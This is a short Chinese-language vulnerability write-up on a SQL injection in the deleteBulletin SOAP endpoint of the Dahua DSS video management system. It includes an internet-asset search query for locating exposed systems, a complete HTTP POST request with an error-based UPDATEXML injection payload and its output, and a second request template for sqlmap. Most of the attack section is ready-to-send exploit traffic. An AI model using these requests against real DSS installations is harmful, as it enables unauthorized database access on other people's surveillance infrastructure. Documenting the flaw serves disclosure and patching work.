# 大华 DSS 视频管理系统deleteBulletin存在SQL注入漏洞

# 一、漏洞简介
大华 DSS 视频管理系统deleteBulletin存在SQL注入漏洞。

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`

![1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc.png](./img/GZOXqaqQQLQw2K7e/1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc-783855.png)

+ 登录页面

![1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590.png](./img/GZOXqaqQQLQw2K7e/1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590-487732.png)

# 四、漏洞复现
```plain
POST /portal/services/itcBulletin HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=0F29FE3B0C2BF1E508A7119E327E2B44; JSESSIONID=D08F471237625640BE6F9DE648EC1EE6
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 436

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:itc="http://itcbulletinservice.webservice.dssc.dahua.com">
   <soapenv:Header/>
   <soapenv:Body>
      <itc:deleteBulletin>
         <!--type: string-->
         <netMarkings>(UPDATEXML(5791,CONCAT(0x2e,0x716b706a71,(SELECT (ELT(5791=5791,1))),0x716a707a71),1058))</netMarkings>
      </itc:deleteBulletin>
   </soapenv:Body>
</soapenv:Envelope>
```

![1705141455973-c800e162-98db-44fe-911e-6cd0f90f3cd6.png](./img/GZOXqaqQQLQw2K7e/1705141455973-c800e162-98db-44fe-911e-6cd0f90f3cd6-633800.png)

```plain
qkpjq1qjpzq
```

sqlmap

```plain
POST /portal/services/itcBulletin HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=0F29FE3B0C2BF1E508A7119E327E2B44; JSESSIONID=D08F471237625640BE6F9DE648EC1EE6
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 346

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:itc="http://itcbulletinservice.webservice.dssc.dahua.com">
   <soapenv:Header/>
   <soapenv:Body>
      <itc:deleteBulletin>
         <!--type: string-->
         <netMarkings>gero et</netMarkings>
      </itc:deleteBulletin>
   </soapenv:Body>
</soapenv:Envelope>
```

![1705141497116-edc5d6fd-4ef0-4ca2-9084-2590cdabbc57.png](./img/GZOXqaqQQLQw2K7e/1705141497116-edc5d6fd-4ef0-4ca2-9084-2590cdabbc57-522695.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xdk0wmobv78llhqb>